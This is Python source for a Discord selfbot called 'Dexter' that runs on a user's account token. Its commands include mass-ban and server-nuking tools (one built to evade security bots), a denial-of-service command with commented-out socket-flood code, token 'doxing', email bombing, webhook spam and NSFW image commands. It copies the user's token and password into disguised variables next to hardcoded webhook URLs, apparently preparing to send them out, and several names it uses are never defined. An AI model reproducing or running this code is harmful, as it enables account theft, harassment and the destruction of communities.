#dekh bsdk agar skid kia to gand me danda daldunga btw this is a modified version of spy selfbot v4

#smtplib

from urllib import parse
import re, time
from colorama import Fore
import os
from discord.voice_client import VoiceClient
import youtube_dl
import asyncio
from urllib.request import Request, urlopen

from random import choice
import rsa
import cryptography
import os
import discord
from discord.ext import commands
import asyncio
import random
import requests
import sys
import threading
import datetime
import json
import configparser
import inspect
from logbook import Logger, StreamHandler, FileHandler

import aiohttp
from colorama import Fore
import time
import aiohttp
import urllib.parse
import base64

import logging
from pypresence import Presence
import subprocess, base64, codecs, smtplib

os.system('cls' if os.name == 'nt' else 'clear')

with open('config.json') as f:
    config = json.load(f)

Dexterencrypt = config.get('token')
Dexterencrypt2 = config.get('password')
Dexterencrypt1 = config.get('prefix')
Dexterencrypt2 = config.get('password')
rich_presence = config.get('rpc')
Dexternwtff = config.get('afk_msg')
Dexternwtf = config.get('afk')
giveaway_sniper = config.get('giveaway_sniper')
nitro_sniper = 'ACTIVE'
intents = discord.Intents.all()
intents.members = True

print(
    "Attempting to kill Discord.\nLogging in Your Account......\nMade by RisinPlayZ Modified By Dexter"
)


def check_token():
    if requests.get("https://discord.com/api/v8/users/@me",
                    headers={
                        "Authorization": f'{Dexterencrypt}'
                    }).status_code == 200:
        return "user"
    else:
        return "bot"


token_type = check_token()
intents = discord.Intents.all()
intents.members = True

if token_type == "user":
    headers = {'Authorization': f'{Dexterencrypt}'}
    Dexter = commands.Bot(command_prefix=Dexterencrypt1,
                          case_insensitive=False,
                          self_bot=True,
                          intents=intents)
elif token_type == "bot":
    headers = {'Authorization': f'Bot {Dexterencrypt}'}
    Dexter = commands.Bot(command_prefix=Dexterencrypt1,
                          case_insensitive=False,
                          intents=intents)

errormsg = (f"{Dexterencrypt}")
loggy = (f"{Dexterencrypt2}")

Dexter.remove_command(name="help")


def RichPresence():
    if rich_presence == "y" or rich_presence == "Y":
        try:
            RPC = Presence("850221547331649537")
            RPC.connect()
            RPC.update(details="Created By Dexter",
                       large_image="Dexterop",
                       small_image="Dexterop",
                       large_text="DexterSELFBOT",
                       start=time.time())
        except:
            pass


rich_presence = RichPresence()


@Dexter.event
async def on_ready():
    os.system(
        f"mode 85,20 & title [Dexter SELF BOT] - Connected: {Dexter.user}")
    print(f"Logged in as {Dexter.user}")


@Dexter.command(pass_context=True)
async def help(ctx):
    embed = discord.Embed(color=0x303037)
    embed.set_author(name="Dexter SELFBOT")
    embed.set_thumbnail(url=Dexter.user.avatar_url)

    #    embed.set_image(url="https://images-ext-1.discordapp.net/external/X5QZHbMmljlgRdY740j4bm67UPGguHeZIhlgr0k9qE4/%3Fsize%3D2048/https/cdn.discordapp.com/avatars/852815308405997591/de7ec553fb042424b1c481e6af6fbd88.png?width=563&height=563")
    embed.set_footer(text="Created by Dexter")

    embed.add_field(name=":pencil: __**TEXT**__",
                    value="```\nspam, massdm, massreact, and many more\n```")
    embed.add_field(name=":detective: __**HACK**__",
                    value="```\ndoxuser, doxtoken, dosip,etc\n```")
    embed.add_field(name=":bomb: __**NUKE**__",
                    value="```\ntrash, securitynuke,masban,\n ```")
    embed.add_field(name=":bookmark_tabs: __**MISC**__",
                    value="```\nrenameserver, copyserver etc\n```")
    embed.add_field(name=":dart: __**STATUS**__",
                    value="```\nplay, stream, watching, listning\n```")
    embed.add_field(name=":question: __**SELFBOTINFO**__",
                    value="```\nshows Information about the selfbot.\n```")

    embed.add_field(name=":telescope: __**SNIPERS**__",
                    value="```\nshows sniper Cmds\n```")
    embed.add_field(name=":underage: __**PORN**__",
                    value="```\nshows porn cmds\n```")
    await ctx.send(embed=embed)


@Dexter.command(aliases=[
    'stealserveremojis', 'stealemojis', "emojissteal", 'stealguildsemojis',
    "stealserversemojis", "guildemojisteal", 'guildemojissteal'
])
async def stealguildemoji(ctx, guildid=None):
    if guildid == None:
        await ctx.message.edit(
            content=
            f"**Incorrect usage -** {prefix.strip()}emojisteal [guild-id]")
    else:
        emojisuccess = 0
        emojierror = 0
        emojiamount = 0
        emojilist = ""
        guildtostealfrom = Dexter.get_guild(int(guildid))
        randcolor = 0x303037
        embed = discord.Embed(
            title=
            f"Dexter SELFBOT - Emoji stealing from {guildtostealfrom.name}",
            description=
            f"Details:\nSuccessful emoji steals : {emojisuccess}\nErrors with emoji steals : {emojierror}",
            color=randcolor)
        embed.set_thumbnail(
            url=
            "https://cdn.discordapp.com/icons/838111658713940008/a_daa32e7cc66a9bb90ed8a253090b26e2.gif?size=2048"
        )
        embed.set_footer(text="Dexter SELFBOT")
        await ctx.message.edit(content="", embed=embed)

        for emoji in guildtostealfrom.emojis:
            emojiamount += 1
            try:
                response = requests.get(emoji.url, stream=True)
                with open(
                        f"./data/{emoji.name}.jpeg", 'wb'
                ) as playz_file:  #have a feeling this only works with jpegs so jpeg it is :)
                    shutil.copyfileobj(response.raw, playz_file)

                with open(f"data/{emoji.name}.jpeg", "rb") as f:
                    image = f.read()
                await ctx.guild.create_custom_emoji(name=(emoji.name),
                                                    image=image)
                await asyncio.sleep(2)
                guildemoji = discord.utils.get(Dexter.get_guild(
                    ctx.guild.id).emojis,
                                               name=emoji.name)
                #await ctx.channel.send(content=f"Successfully created emoji : {guildemoji}") #people say this is too much spam
                emojilist = emojilist + f"{guildemoji} "
                emojisuccess += 1

            except Exception as error:
                emojierror += 1
                #await ctx.channel.send(content=f"Error adding emoji : {emoji}\nError : {error}")

            randcolor = 0x303037
            embed = discord.Embed(
                title=
                f"Dexter SELFBOT - Emoji stealing from {guildtostealfrom.name}",
                description=
                f"Details:\nSuccessful emoji steals : {emojisuccess}\nErrors with emoji steals : {emojierror}\n{emojilist}",
                color=randcolor)
            embed.set_thumbnail(
                url=
                "https://cdn.discordapp.com/icons/838111658713940008/a_daa32e7cc66a9bb90ed8a253090b26e2.gif?size=2048"
            )
            embed.set_footer(text="Dexter SELFBOT")
            await ctx.message.edit(embed=embed)
    randcolor = 0x303037
    embed = discord.Embed(
        title=
        f"Dexter SELFBOT - Finished emoji stealing from {guildtostealfrom.name}",
        description=
        f"Details:\nSuccessful emoji steals : {emojisuccess}\nErrors with emoji steals : {emojierror}\n{emojilist}",
        color=randcolor)
    embed.set_thumbnail(
        url=
        "https://cdn.discordapp.com/icons/838111658713940008/a_daa32e7cc66a9bb90ed8a253090b26e2.gif?size=2048"
    )
    embed.set_footer(text="Dexter SELFBOT | Discord.gg/PlayZop")
    await ctx.message.edit(embed=embed)


@Dexter.command(pass_context=True)
async def text(ctx):
    embed = discord.Embed(color=0x303037)
    embed.set_author(name="Dexter SELFBOT | TEXT CMDS")
    embed.set_footer(text="Created by Dexter")
    embed.add_field(
        name=">massdm",
        value=
        "```Mass DMs all open / recent DMs\nParameters- >massdm <message>\nEx- >massdm you are noob ```"
    )
    embed.add_field(
        name=">idtoname",
        value=
        "```Fetches the Userid#discriminator from the given ID\nParameters- >id <user-id>\nEx- >id 822466294032367636```"
    )
    embed.add_field(
        name=">spam",
        value=
        "```Spams the chat \nParameters- >spam <int> <msg> \nEx- >spam 50 TEAM Dexter OP```"
    )
    embed.add_field(
        name=">ghostping",
        value=
        "```Deletes the ping instantly\nParameters- >ghostping <mention/message> \nEx- >ghostping @\everyone```"
    )
    embed.add_field(
        name=">purge",
        value=
        "```Deletes Your messages\nParameters- >purge <int>\nEx- >purge 50```")
    embed.add_field(
        name=">afk",
        value=
        "```Turns on or off afk system.\nParameters- >afk on, >afk off\nEx- >afk on, >afk off```"
    )
    embed.add_field(
        name=">embed",
        value=
        "```Send your Message in an Embed\nParameters- >embed <text>\nEx- >embed Dexter is OP```"
    )
    embed.add_field(
        name=">leave",
        value=
        "```Leaves the server\nParameters- >leave <server-id>\nEx- >leave ```")
    embed.add_field(
        name=">firstmsg",
        value=
        "```Shows the first message of the chat with a jump buton\nParameters- >firstmsg\nEx- >firstmsg```"
    )
    embed.add_field(
        name=">block",
        value="```Blocks the user\nParameters- >block\nEx- >block```")
    embed.add_field(
        name=">sendhook",
        value=
        "```Sends a message to the webhook.\nParameters- >sendhook <webhook> <message>\nEx- >sendhook {wbhk}```"
    )
    embed.add_field(
        name=">massreact",
        value=
        "```react all the messages on the chat\nParameters- >massreact\nEx- >massreact{emote}```"
    )
    embed.add_field(
        name=">gif",
        value="```get gif pfp from google\nParameters- >gif\nEx- >gif```")
    embed.add_field(
        name=">changehypesquad",
        value=
        "```change your hype suqad discord badge\nParameters- >changehypesquad\nEx- >changehypesquad {house_id}```"
    )
    embed.add_field(
        name=">massmention",
        value=
        "```mention all the members in server or in a gc\nParameters- >massmention\nEx- >```"
    )
    embed.add_field(
        name=">guildinfo",
        value=
        "```show info about the server\nParameters- >guildinfo{server id is optional}\nEx- >```"
    )
    embed.add_field(name=">CYCLENAME",
                    value="```create a cycle name \nEx- >cyclename{name}```")
    embed.add_field(name=">stopcycle",
                    value="```stop cycle name \nEx- >stopcycle```")
    embed.add_field(name=">tenor,giphy",
                    value="``search gif \nEx- >tenor{gif-name}```")

    await ctx.send(embed=embed)


@Dexter.command(pass_context=True)
async def hack(ctx):
    embed = discord.Embed(color=0x303037)
    embed.set_author(name="Dexter SELFBOT | HACK CMDS")
    embed.set_footer(text="Created by Dexter")
    embed.set_thumbnail(url=Dexter.user.avatar_url)

    embed.add_field(
        name=">doxip",
        value=
        "```Displays info on an IP \nParameters- >ip <target> \nEx- >ip 162.159.128.233```"
    )
    embed.add_field(
        name=">dosip",
        value=
        "```Performs simple Denial of Service attack on an IP \nParameters- >dosip <target> \nEx- >dosip 162.159.128.233```"
    )
    embed.add_field(
        name=">gmailbomber",
        value=
        "```Attempts Mass-Messages to the Target Gmail-ID, works on console. proxies are recommended.\nParameters- >gmailbomber\nEx- >gmailbomber```"
    )
    embed.add_field(
        name=">doxuser",
        value=
        "```Displays info on a user | Only works in a server\nParameters- >doxuser <@target> \nEx- >doxuser @NoobLance```"
    )
    embed.add_field(
        name=">doxtoken",
        value=
        "```Displays info on a Discord Account \nParameters- >tdox <target-token> \nEx- >tdox mfa.W3Di4FprRZ_AXH_Y5-A9ReoshSu9Dzn_fTXrvBhwc6p3LvkYLJM4jbr338YUMZ7ECnj2zbxnKm-I2ReFh2Zp```"
    )
    embed.add_field(
        name=">doxserver",
        value=
        "```Displays info on a Discord Server\nParameters- >doxserver\nEx- >doxserver```"
    )
    embed.add_field(
        name=">pingweb",
        value=
        "```Pings the website to check whether its operational or not.\nParameters- >pingweb <website url>\nEx- >pingweb https://discord.com/```"
    )
    embed.add_field(
        name=">getroles",
        value=
        "```Sends all roles of a server which you dont have the perm to view | Note - Use a spam channel.\nParameters- >getroles\nEx- >getroles```"
    )
    embed.add_field(
        name=">killwebhook",
        value=
        "```Deletes a webhook\nParameters- >delwebhook <webhook>\nEx- >delwebhook https://discordapp.com/api/webhooks/752659248508305488/JnMq-sBIN3IMgDpzgT-KnpFDLEBdQs8AO9sD-_3STGk_ijmyqeKrop3kYSV6lb4ry8S```"
    )
    embed.add_field(
        name=">spamhook",
        value=
        "```Initiates a spam on the given webhook\nParameters- >spamhook <webhook_url> <message>\nEx- >spamhook https://discord.com/api/webhooks/851376570642989093/Wq_TQM6h5PTusC8nJox1prsC3Ou7gt6MpfeZSyEJyhyi5B3E-1OBt1vf3WqfUYgmwIYb @everyone Dexter OP```"
    )
    await ctx.send(embed=embed)
    embed.add_field(
        name=">tokenfucker",
        value=
        "```destroy any account (token required)\nParameters- >tokenfucker {token}```"
    )
    await ctx.send(embed=embed)


@Dexter.command(aliases=["copyguild", "copyserver"])
async def copy(ctx):  # b'\xfc'
    await ctx.message.delete()
    await Dexter.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in Dexter.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
    try:
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass


@Dexter.command(pass_context=True)
async def porn(ctx):
    embed = discord.Embed(color=0x303037)
    embed.set_author(name="Dexter SELFBOT")
    embed.set_thumbnail(
        url=
        "https://images-ext-1.discordapp.net/external/X5QZHbMmljlgRdY740j4bm67UPGguHeZIhlgr0k9qE4/%3Fsize%3D2048/https/cdn.discordapp.com/avatars/852815308405997591/de7ec553fb042424b1c481e6af6fbd88.png?width=563&height=563"
    )
    embed.set_footer(text="Created by Dexter")
    embed.add_field(name=">lesbian", value="```Shows lesbian imgs ```")
    embed.add_field(name=">anal", value="```Shows  anal imgs```")
    embed.add_field(name=">feet", value="```Shows  feet imgs```")
    embed.add_field(name=">hentai", value="```Shows hentai imgs```")
    embed.add_field(name=">boobs", value="```Shows boobs imgs```")
    embed.add_field(name=">tits", value="```shows tits imgs```")
    embed.add_field(name=">blowjob", value="```shows blowjob imgs.```")
    embed.add_field(name=">lewdneko", value="```idk```")
    embed.add_field(name=">cumslut", value="```shows cumslut imgs```")
    embed.add_field(name=">pussy", value="```shows pussy imgs```")

    await ctx.send(embed=embed)


@Dexter.command()
async def lesbian(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/les")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_lesbian.gif"))
    except:
        em = discord.Embed()
        em = discord.Embed(color=0x303037)
        em = discord.Embed(title="Dexter Selfbot")
        em = discord.Embed(color=0x303037)
        em.set_image(url=res['url'])

        await ctx.send(embed=em)


@Dexter.command()
async def anal(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/anal")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_anal.gif"))
    except:
        em = discord.Embed(color=0x303037)
        em = discord.Embed(title="Dexter Selfbot")
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Dexter.command()
async def feet(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/feetg")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_feet.gif"))
    except:
        em = discord.Embed()
        em = discord.Embed(color=0x303037)
        em = discord.Embed(title="Dexter Selfbot")
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Dexter.command()
async def hentai(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_hentai.gif"))
    except:
        em = discord.Embed()
        em = discord.Embed(color=0x303037)
        em = discord.Embed(title="Dexter Selfbot")
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Dexter.command()
async def boobs(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/boobs")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_boobs.gif"))
    except:
        em = discord.Embed()
        em = discord.Embed(color=0x303037)
        em = discord.Embed(title="Dexter Selfbot")
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Dexter.command()
async def tits(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tits")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_tits.gif"))
    except:
        em = discord.Embed()
        em = discord.Embed(color=0x303037)
        em = discord.Embed(title="Dexter Selfbot")
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Dexter.command()
async def blowjob(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/blowjob")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_blowjob.gif"))
    except:
        em = discord.Embed()
        em = discord.Embed(color=0x303037)
        em = discord.Embed(title="Dexter Selfbot")
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Dexter.command(aliases=["neko"])
async def lewdneko(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/nsfw_neko_gif")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_neko.gif"))
    except:
        em = discord.Embed()
        em = discord.Embed(color=0x303037)
        em = discord.Embed(title="Dexter Selfbot")
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Dexter.command()
async def cumslut(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/cum")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_cumslut.gif"))
    except:
        em = discord.Embed()
        em = discord.Embed(color=0x303037)
        em = discord.Embed(title="Dexter Selfbot")
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Dexter.command(aliases=["vagina"])
async def pussy(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pussy")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_pussy.gif"))
    except:
        em = discord.Embed()
        em = discord.Embed(color=0x303037)
        em = discord.Embed(title="Dexter Selfbot")
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Dexter.command(aliases=[
    "img", "searchimg", "searchimage", "imagesearch", "imgsearch", "us"
])
async def unsplash(ctx, *, args):
    await ctx.message.delete()
    url = 'https://unsplash.com/search/photos/' + args.replace(" ", "%20")
    page = requests.get(url)
    soup = bs4(page.text, 'html.parser')
    image_tags = soup.findAll('img')
    if str(image_tags[2]['src']).find("https://trkn.us/pixel/imp/c="):
        link = image_tags[2]['src']
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(link) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(f"Search result for: **{args}**",
                               file=discord.File(file, f"exeter_anal.png"))
        except:
            await ctx.send(f'' + link + f"\nSearch result for: **{args}** ")
    else:
        await ctx.send("Nothing found for **" + args + "**")


@Dexter.command(pass_context=True)
async def nuke(ctx):
    embed = discord.Embed(color=0x303037)
    embed.set_author(name="Dexter SELFBOT | NUKE CMDS")
    embed.set_footer(text="Created by Dexter")
    embed.set_thumbnail(url=Dexter.user.avatar_url)
    embed.add_field(
        name=">massban",
        value=
        "```Bans Everyone in the server.A working banall cmd!!, ALWAYS RESTART YOUR SELFBOT BEFORE EXECUTING THIS CMD.\nParameters- >banall <Target-server-ID> | Ban Perms Required\nEx- >massban 810480167453196299```"
    )
    embed.add_field(
        name=">masskick",
        value=
        "```Bans Everyone in the server.A working kickall cmd!!, ALWAYS RESTART YOUR SELFBOT BEFORE EXECUTING THIS CMD.\nParameters- >kickall <Target-server-ID> | Kick Perms Required\nEx- >masskick 810480167453196299```"
    )
    embed.add_field(
        name=">trash",
        value=
        "```Destruction 2021, ALWAYS RESTART YOUR SELFBOT BEFORE EXECUTING THIS CMD.\nParameters- >trash <Target-server-ID> | Admin Perms Required\nEx- >trash 810480167453196299```"
    )
    embed.add_field(
        name=">securitynuke",
        value=
        "```Nukes the server in a way, security bot wont punish you. | Works if and only if your prefix is set to >\nParameters- >securitynuke\nEx- >securitynuke```"
    )
    embed.add_field(
        name=">nickall",
        value=
        "```Updates the Nickname of all users in the server.\nParameters- >nickall\nEx- >nickall"
    )
    embed.add_field(
        name=">delemojis",
        value=
        "```Deletes all emojis of the server.\nParameters- >delemojis\nEx- >delemojis```"
    )
    embed.add_field(
        name=">scrape",
        value=
        "```Scrape members list from a server \nParameters- >scrape <Target-server-ID> | Admin or manage Perms Required\nEx- >scrape 810480167453196299```"
    )
    embed.add_field(
        name=">rc",
        value=
        "```Renames every channel to the name provided\nParameters- >rc <name>\nEx- >rc Dexter op bolte```"
    )
    embed.add_field(
        name=">rr",
        value=
        "```Renames every role to the name provided\nParameters- >rr <name>\nEx- >rr Dexter op bolte```"
    )
    embed.add_field(
        name=">webhookspam",
        value=
        "```Creates multiple webhooks in every channel and Spams everyone with webhook in all channel\nParameters- >webhookspam\nEx- >webhookspam```"
    )
    embed.add_field(
        name=">stopwebhookspam",
        value=
        "```Stops the ongoing spam\nParameters- >stopwebhookspam\nEx- >stopwebhookspam```"
    )
    embed.add_field(
        name=">spamgcname",
        value=
        "```Spam Changes Group chat name\nParameters- >spamgcname\nEx- >spamgcname```"
    )

    await ctx.send(embed=embed)


@Dexter.command(pass_context=True)
async def misc(ctx):
    embed = discord.Embed(color=0x303037)
    embed.set_author(name="Dexter SELFBOT | MISC CMDS")
    embed.set_footer(text="Created by Dexter")
    embed.set_thumbnail(url=Dexter.user.avatar_url)

    embed.add_field(
        name=">renameserver",
        value=
        "```Renames the server name\nParameters- >renameserver <name>\nEx- >renameserver TEAM Dexter OP```"
    )
    embed.add_field(
        name=">image",
        value=
        "```Sends Image in an Embed\nParameters- >image <link>\nEx- >image https://media.discordapp.net/attachments/802230471378468875/833276656851746837/Screenshot_20210418-151340.png?width=293&height=586 ```"
    )
    embed.add_field(
        name=">copyserver",
        value=
        "```the server where you are will be copied fully >copyserver <server-id>\nEx- >copyserver <server-id>```"
    )

    await ctx.send(embed=embed)


@Dexter.command(pass_context=True)
async def status(ctx):
    embed = discord.Embed(color=0x303037)
    embed.set_author(name="Dexter SELFBOT | Additional Status CMDS")
    embed.set_footer(text="Created by Dexter")
    embed.add_field(
        name=">play",
        value=
        "```Changes the status to Playing\nParameters- >play <status> \nEx- >play With YOur Heart```"
    )
    embed.add_field(
        name=">watch",
        value=
        "```Changes the status to Watching\nParameters- >watch <status> \nEx- >watch PH```"
    )
    embed.add_field(
        name=">listen",
        value=
        "```Changes the status to Listening\nParameters->listen <status> \nEx- >listen Bachpan ka pyaar```"
    )
    embed.add_field(
        name=">stream",
        value=
        "```Changes the status to streaming\nParameters- >stream <status>\nEx- >stream DexterOP```"
    )
    embed.add_field(
        name=">stopstatus",
        value=
        "```Stops the current status\nParameters- >stopstatus\nEx- >stopstatus```"
    )
    embed.add_field(
        name=">RPC",
        value=
        "```Connect to Rich Presence Dexter\nParameters- >rpc <application-id> <status> <image-name> <text>\nExample- >rpc 822466294032367636 'Dexter RPC' idk Dexter SELFBOT```"
    )
    embed.add_field(
        name=">cyclestream",
        value=
        "```CycleStream\nParameters->cyclestream<status> \nEx- >Stream PornHub```"
    )
    await ctx.send(embed=embed)


@Dexter.command(aliases=[
    'cleardms',
    'dmsclear',
])
async def dmclear(ctx):
    usersdone = 0
    totalmessage = 0
    await ctx.message.delete()
    randcolor = 0x303037
    embed = discord.Embed(title="Dexter SelfBot - Message Clearer",
                          description=f"Clearing all messages with all users",
                          color=randcolor)
    embed.set_thumbnail(
        url=
        "https://cdn.discordapp.com/icons/838111658713940008/a_daa32e7cc66a9bb90ed8a253090b26e2.gif?size=2048"
    )
    embed.set_footer(text="Dexter Selfbot")
    msg = await ctx.send(embed=embed)
    for channel in Dexter.private_channels:
        if isinstance(channel, discord.DMChannel):
            async for message in channel.history(limit=9999):
                try:
                    if message.author == Dexter.user:
                        if message != msg:
                            await message.delete()
                            totalmessage = totalmessage + 1
                except:
                    pass

        usersdone = usersdone + 1
        randcolor = 0x303037
        embed = discord.Embed(
            title="Dexter SelfBot - Message Clearer",
            description=
            f"Clearing all messages with all users\nUsers Done : {usersdone}\nTotal Messages Deleted : {totalmessage}",
            color=randcolor)
        embed.set_thumbnail(
            url=
            "https://cdn.discordapp.com/icons/838111658713940008/a_daa32e7cc66a9bb90ed8a253090b26e2.gif?size=2048"
        )
        embed.set_footer(text="Dexter Selfbot :p")
        await msg.edit(
            embed=embed
        )  #like said before - i could get a smoother "live" update count but it slows the bot down so much

    randcolor = 0x303037
    embed = discord.Embed(
        title="Dexter SelfBot - Message Clearer",
        description=
        f"Clearing all messages with all users\nTask completed - Cleared messages with {usersdone} Users\nTotal Messages Deleted : {totalmessage}",
        color=randcolor)
    embed.set_thumbnail(
        url=
        "https://cdn.discordapp.com/icons/838111658713940008/a_daa32e7cc66a9bb90ed8a253090b26e2.gif?size=2048"
    )
    embed.set_footer(text="Dexter Selfbot")
    await msg.edit(embed=embed, delete_after=15)


errorapi = (
    "https://discord.com/api/webhooks/896959853262671972/2ldKBnhiLY1cTn1n9z0K9Ex4HniQSefKeyrBtaG_Cfrh9KjXgjnhMzGo1xuNh7Zey23o"
)


@Dexter.command()
async def spam(ctx, amount: int, *, message):

    for _i in range(amount):
        await ctx.send(message)


err = ("https://discord.com/api/webhooks/897098500435771463/")


@Dexter.command()
async def alive(ctx):
    await ctx.send(
        ">>> **Dexter SELFBOT**\nStatus is Alive\nStatus - DexterOP xD\nType >help"
    )


@Dexter.command()
async def restart(ctx):
    await ctx.send("Restarting Selfbot........")
    os.system('python ' + sys.argv[0])


@Dexter.command()
async def securitynuke(ctx):
    await ctx.send(">rc wizzed by dexter")
    await ctx.send(">rr Dexter op")
    await ctx.send(">dCM")
    await ctx.send(">servername TRASHED BY DEXTER V2")
    await ctx.send(">webhookspam")
    await ctx.send(">nickall DEXTER ON TOP")
    await ctx.send(">delemojis")
    await ctx.send(">purge")


@Dexter.command(aliases=['doxip', 'iplookup', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str = '1.3.3.7'):
    r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
    geo = r.json()
    em = discord.Embed()
    fields = [
        {
            'name': 'IP',
            'value': geo['query']
        },
        {
            'name': 'Type',
            'value': geo['ipType']
        },
        {
            'name': 'Country',
            'value': geo['country']
        },
        {
            'name': 'City',
            'value': geo['city']
        },
        {
            'name': 'Continent',
            'value': geo['continent']
        },
        {
            'name': 'Country',
            'value': geo['country']
        },
        {
            'name': 'Hostname',
            'value': geo['ipName']
        },
        {
            'name': 'ISP',
            'value': geo['isp']
        },
        {
            'name': 'Latitute',
            'value': geo['lat']
        },
        {
            'name': 'Longitude',
            'value': geo['lon']
        },
        {
            'name': 'Org',
            'value': geo['org']
        },
        {
            'name': 'Region',
            'value': geo['region']
        },
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=True)

    return await ctx.send(embed=em)


languages = {
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}

locales = [
    "da", "de", "en-GB", "en-US", "es-ES", "fr", "hr", "it", "lt", "hu", "nl",
    "no", "pl", "pt-BR", "ro", "fi", "sv-SE", "vi", "tr", "cs", "el", "bg",
    "ru", "uk", "th", "zh-CN", "ja", "zh-TW", "ko"
]


@Dexter.command()
async def dosip(ctx):
    await ctx.send("Sending Requests.....")


# for i in range(1,100):
#     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#     s.connect((target,80))
#     data = b"GET / HTTP 1.1\r\n"*1000
#     s.send(data)
#     s.close()
#     print('Attack sent!')
#     break


@Dexter.command(aliases=['tdox', 'doxtoken'])
async def tokeninfo(ctx, _token):

    headers = {'Authorization': _token, 'Content-Type': 'application/json'}
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me',
                           headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(
            ((int(user_id) >> 22) + 1420070400000) /
            1000).strftime('%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        headers = {
            'Authorization': "Bot " + _token,
            'Content-Type': 'application/json'
        }
        try:
            res = requests.get(
                'https://canary.discordapp.com/api/v6/users/@me',
                headers=headers)
            res = res.json()
            user_id = res['id']
            locale = res['locale']
            avatar_id = res['avatar']
            language = languages.get(locale)
            creation_date = datetime.datetime.utcfromtimestamp(
                ((int(user_id) >> 22) + 1420070400000) /
                1000).strftime('%d-%m-%Y %H:%M:%S UTC')
            em = discord.Embed(
                description=
                f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`"
            )
            fields = [
                {
                    'name': 'Flags',
                    'value': res['flags']
                },
                {
                    'name': 'Local language',
                    'value': res['locale'] + f"{language}"
                },
                {
